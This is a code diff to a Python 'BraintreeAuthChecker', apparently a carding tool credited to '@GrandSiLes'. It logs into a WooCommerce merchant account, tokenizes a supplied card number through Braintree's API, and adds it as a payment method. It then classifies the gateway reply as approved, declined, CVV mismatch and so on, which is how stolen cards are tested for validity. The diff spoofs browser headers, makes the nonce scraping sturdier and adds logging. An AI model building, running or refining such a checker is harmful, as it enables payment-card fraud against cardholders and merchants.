@@ -21,9 +21,10 @@ class BraintreeAuthChecker:
         
         # Common headers
         self.headers = {
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'no-cache',
         }
 
     def parse_card_data(self, lista: str) -> Optional[Dict[str, str]]:
@@ -94,27 +95,38 @@ class BraintreeAuthChecker:
             url = f"{self.base_url}/my-account/"
             response = self.session.get(url, headers=self.headers, timeout=10)
             
+            logger.info(f"Login page status: {response.status_code}")
+            
             if response.status_code != 200:
                 return None, f"Failed to load login page: {response.status_code}"
             
             # Extract login nonce
             nonce_match = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text)
             if not nonce_match:
+                # Try alternative pattern
+                nonce_match = re.search(r'woocommerce-login-nonce["\']?[^>]*value=["\']?([^"\'>]+)', response.text)
+            
+            if not nonce_match:
+                logger.error("Could not find login nonce in response")
                 return None, "Could not find login nonce"
             
-            return nonce_match.group(1), None
+            nonce = nonce_match.group(1)
+            logger.info(f"Found login nonce: {nonce}")
+            return nonce, None
             
         except Exception as e:
+            logger.error(f"Error getting login nonce: {str(e)}")
             return None, f"Error getting login nonce: {str(e)}"
 
     def is_logged_in(self, html_content: str) -> bool:
         """Check if login was successful"""
         patterns = [
-            r'woocommerce-MyAccount-navigation-link--dashboard',
-            r'woocommerce-MyAccount-navigation-link--orders',
-            r'woocommerce-MyAccount-navigation-link--payment-methods'
+            r'woocommerce-MyAccount-navigation',
+            r'Log out',
+            r'My Account',
+            r'Dashboard'
         ]
-        return any(re.search(pattern, html_content) for pattern in patterns)
+        return any(re.search(pattern, html_content, re.IGNORECASE) for pattern in patterns)
 
     def login(self) -> bool:
         """Login to the account"""
@@ -139,18 +151,34 @@ class BraintreeAuthChecker:
                 'content-type': 'application/x-www-form-urlencoded',
                 'origin': self.base_url,
                 'referer': f"{self.base_url}/my-account/",
-                'cache-control': 'max-age=0',
+                'cache-control': 'no-cache',
             })
             
+            logger.info("Attempting login...")
             response = self.session.post(
                 f"{self.base_url}/my-account/",
                 data=login_data,
                 headers=login_headers,
-                timeout=10,
+                timeout=15,
                 allow_redirects=True
             )
             
-            return self.is_logged_in(response.text)
+            logger.info(f"Login response status: {response.status_code}")
+            logger.info(f"Login response URL: {response.url}")
+            
+            # Check if login was successful
+            logged_in = self.is_logged_in(response.text)
+            logger.info(f"Login successful: {logged_in}")
+            
+            if not logged_in:
+                # Check for error messages
+                error_match = re.search(r'woocommerce-error[^>]*>.*?<li>(.*?)</li>', response.text, re.DOTALL)
+                if error_match:
+                    logger.error(f"Login error: {error_match.group(1).strip()}")
+                else:
+                    logger.error("Login failed - unknown reason")
+            
+            return logged_in
             
         except Exception as e:
             logger.error(f"Login error: {e}")
@@ -162,24 +190,30 @@ class BraintreeAuthChecker:
             url = f"{self.base_url}/my-account/add-payment-method/"
             response = self.session.get(url, headers=self.headers, timeout=10)
             
+            logger.info(f"Payment page status: {response.status_code}")
+            
             if response.status_code != 200:
                 return None, f"Failed to load payment page: {response.status_code}"
             
             # Try multiple patterns to find payment nonce
             patterns = [
                 r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',
-                r'woocommerce-add-payment-method-nonce.*?value="(.*?)"',
-                r'id="woocommerce-add-payment-method-nonce".*?value="(.*?)"'
+                r'woocommerce-add-payment-method-nonce["\']?[^>]*value=["\']?([^"\'>]+)',
+                r'id="woocommerce-add-payment-method-nonce"[^>]*value="(.*?)"'
             ]
             
             for pattern in patterns:
                 nonce_match = re.search(pattern, response.text, re.DOTALL)
                 if nonce_match:
-                    return nonce_match.group(1), None
+                    nonce = nonce_match.group(1)
+                    logger.info(f"Found payment nonce: {nonce}")
+                    return nonce, None
             
+            logger.error("Could not find payment nonce with any pattern")
             return None, "Could not find payment nonce"
             
         except Exception as e:
+            logger.error(f"Error getting payment nonce: {str(e)}")
             return None, f"Error getting payment nonce: {str(e)}"
 
     def tokenize_card(self, card_data: Dict[str, str]) -> Tuple[Optional[str], Optional[str]]:
@@ -190,7 +224,7 @@ class BraintreeAuthChecker:
                 'Referer': 'https://assets.braintreegateway.com/',
                 'Braintree-Version': '2018-05-10',
                 'Content-Type': 'application/json',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
             }
             
             json_data = {
@@ -216,6 +250,7 @@ class BraintreeAuthChecker:
                 'operationName': 'TokenizeCreditCard',
             }
             
+            logger.info("Tokenizing card...")
             response = requests.post(
                 'https://payments.braintree-api.com/graphql',
                 headers=braintree_headers,
@@ -223,16 +258,25 @@ class BraintreeAuthChecker:
                 timeout=10
             )
             
+            logger.info(f"Braintree API response status: {response.status_code}")
+            
             if response.status_code == 200:
                 data = response.json()
                 if 'data' in data and 'tokenizeCreditCard' in data['data']:
-                    return data['data']['tokenizeCreditCard']['token'], None
+                    token = data['data']['tokenizeCreditCard']['token']
+                    logger.info(f"Card tokenized successfully: {token[:20]}...")
+                    return token, None
                 else:
-                    return None, f"Tokenization failed: {data}"
+                    error_msg = f"Tokenization failed: {data}"
+                    logger.error(error_msg)
+                    return None, error_msg
             else:
-                return None, f"Braintree API error: {response.status_code}"
+                error_msg = f"Braintree API error: {response.status_code} - {response.text}"
+                logger.error(error_msg)
+                return None, error_msg
                 
         except Exception as e:
+            logger.error(f"Tokenization error: {str(e)}")
             return None, f"Tokenization error: {str(e)}"
 
     def add_payment_method(self, token: str, payment_nonce: str) -> Tuple[Optional[str], Optional[str]]:
@@ -257,30 +301,40 @@ class BraintreeAuthChecker:
                 'content-type': 'application/x-www-form-urlencoded',
                 'origin': self.base_url,
                 'referer': f"{self.base_url}/my-account/add-payment-method/",
-                'cache-control': 'max-age=0',
+                'cache-control': 'no-cache',
             })
             
+            logger.info("Adding payment method...")
             response = self.session.post(
                 f"{self.base_url}/my-account/add-payment-method/",
                 data=payment_data,
                 headers=payment_headers,
-                timeout=10,
+                timeout=15,
                 allow_redirects=True
             )
             
+            logger.info(f"Payment method response status: {response.status_code}")
+            
             # Extract response message
-            error_match = re.search(r'<ul class="woocommerce-error".*?<li>(.*?)</li>', response.text, re.DOTALL)
+            error_match = re.search(r'<ul class="woocommerce-error"[^>]*>.*?<li>(.*?)</li>', response.text, re.DOTALL)
             if error_match:
-                return error_match.group(1).strip(), None
+                message = error_match.group(1).strip()
+                logger.info(f"Payment error: {message}")
+                return message, None
             else:
                 # Check for success
                 success_match = re.search(r'woocommerce-message', response.text)
                 if success_match:
-                    return "Payment method added successfully", None
+                    message = "Payment method added successfully"
+                    logger.info(message)
+                    return message, None
                 else:
-                    return "Unknown response", None
+                    message = "Unknown response from payment method"
+                    logger.warning(message)
+                    return message, None
                     
         except Exception as e:
+            logger.error(f"Payment method error: {str(e)}")
             return None, f"Payment method error: {str(e)}"
 
     def categorize_response(self, response_msg: str) -> str:
@@ -337,58 +391,6 @@ class BraintreeAuthChecker:
             "inconsistent data", "verifications are not supported on this merchant account"
         ]
 
-        paypal_keywords = [
-            "paypal business account preference resulted in the transaction failing",
-            "paypal business account restricted", "paypal business account locked or closed",
-            "paypal blocking duplicate order ids", "paypal buyer revoked pre-approved payment authorization",
-            "paypal payee account invalid or does not have a confirmed email",
-            "paypal payee email incorrectly formatted", "paypal validation error",
-            "funding instrument in the paypal account was declined by the processor or bank,or it can't be used for this payment",
-            "payer account is locked or closed", "payer cannot pay for this transaction with paypal",
-            "transaction refused due to paypal risk model", "paypal merchant account configuration error",
-            "paypal pending payments are not supported", "paypal domestic transaction required",
-            "paypal phone number required", "paypal tax info required", "paypal payee blocked transaction",
-            "paypal transaction limit exceeded", "paypal reference transactions not enabled for your account",
-            "currency not enabled for your paypal seller account", "paypal payee email permission denied for this request",
-            "paypal or venmo account not configured to refund more than settled amount",
-            "currency of this transaction must match currency of your paypal account",
-            "paypal payment method is invalid", "paypal payment has already been completed",
-            "paypal refund is not allowed after partial refund", "paypal buyer account can't be the same as the seller account",
-            "paypal authorization amount limit exceeded", "paypal authorization count limit exceeded",
-            "paypal channel initiated billing not enabled for your account", "paypal risk rejected",
-            "paypal pending payments not supported", "paypal refund transaction with an open case not allowed",
-            "paypal refund attempt limit reached", "paypal refund transaction not allowed",
-            "paypal refund invalid partial amount", "paypal refund merchant account missing ach", "venmo"
-        ]
-
-        temporary_keywords = [
-            "processor network unavailable– try again", "no action taken", "offline issuer declined",
-            "cannot authorize at this time(life cycle)", "cannot authorize at this time(policy)",
-            "duplicate transaction", "partial approval for amount in group iii version",
-            "authorization could not be found", "already reversed",
-            "reversal amount does not match authorization amount",
-            "issuer or cardholder has put a restriction on the card",
-            "no data found- try another verification method", "refund time limit exceeded",
-            "authorization expired", "already captured", "already refunded",
-            "capture amount exceeded allowable limit"
-        ]
-
-        gateway_rejection_keywords = [
-            "avs rejected", "address verification rejected", "avs mismatch", "avs check failed", "avs not accepted",
-            "cvv rejected", "cvv verification rejected", "cvv mismatch", "cvv check failed", "cvv not accepted",
-            "fraud rejected", "fraud protection rejected", "advanced fraud tools rejected", "risk threshold rejected", "fraud filter rejected",
-            "3d secure rejected", "three-d secure rejected", "liability shift rejected", "authentication rejected",
-            "token rejected", "payment method token rejected", "vault rejection", "tokenization rejected",
-            "application rejected", "duplicate transaction rejected", "velocity control rejected", "amount threshold rejected",
-            "admin rejected", "administrative rejection", "manual review required", "suspicious activity detected",
-            "processor not responding", "processor connection rejected", "gateway timeout", "connection timeout",
-            "account not configured", "merchant account rejected", "submerchant rejected", "account suspended",
-            "bin rejected", "bank identification number rejected", "issuer bin rejected", "card bin rejected",
-            "country rejected", "country restriction", "geo location rejected", "ip address rejected",
-            "currency rejected", "unsupported currency", "currency mismatch", "currency not allowed",
-            "industry type rejected", "mcc rejected", "merchant category rejected", "business type rejected"
-        ]
-
         if any(kw in response for kw in approved_keywords):
             return "APPROVED"
         elif any(kw in response for kw in ccn_cvv_keywords):
@@ -399,12 +401,6 @@ class BraintreeAuthChecker:
             return "INSUFFICIENT FUNDS/LIMIT"
         elif any(kw in response for kw in setup_error_keywords):
             return "SETUP ERROR"
-        elif any(kw in response for kw in paypal_keywords):
-            return "PAYPAL/VENMO ISSUE"
-        elif any(kw in response for kw in temporary_keywords):
-            return "TEMPORARY ISSUE"
-        elif any(kw in response for kw in gateway_rejection_keywords):
-            return "GATEWAY REJECTION"
         elif any(kw in response for kw in declined_keywords):
             return "DECLINED"
         else:
@@ -419,16 +415,21 @@ class BraintreeAuthChecker:
                 "error": "Invalid card format. Use: ccn|mm|yy|cvv"
             }
         
+        logger.info(f"Checking card: {card_data['cc'][:6]}******")
+        
         # Get BIN info
         bin_info = self.get_bin_info(card_data['bin'])
+        logger.info(f"BIN info: {bin_info}")
         
         # Login
+        logger.info("Attempting to login...")
         if not self.login():
             return {
-                "error": "Failed to login to account"
+                "error": "Failed to login to account - check credentials or website availability"
             }
         
         # Get payment nonce
+        logger.info("Getting payment nonce...")
         payment_nonce, error = self.get_payment_nonce()
         if error:
             return {
@@ -436,6 +437,7 @@ class BraintreeAuthChecker:
             }
         
         # Tokenize card
+        logger.info("Tokenizing card with Braintree...")
         token, error = self.tokenize_card(card_data)
         if error:
             return {
@@ -443,6 +445,7 @@ class BraintreeAuthChecker:
             }
         
         # Add payment method
+        logger.info("Adding payment method...")
         response_msg, error = self.add_payment_method(token, payment_nonce)
         if error:
             return {
@@ -451,6 +454,7 @@ class BraintreeAuthChecker:
         
         # Categorize response
         status = self.categorize_response(response_msg)
+        logger.info(f"Final status: {status}")
         
         return {
             "Author": "@GrandSiLes",
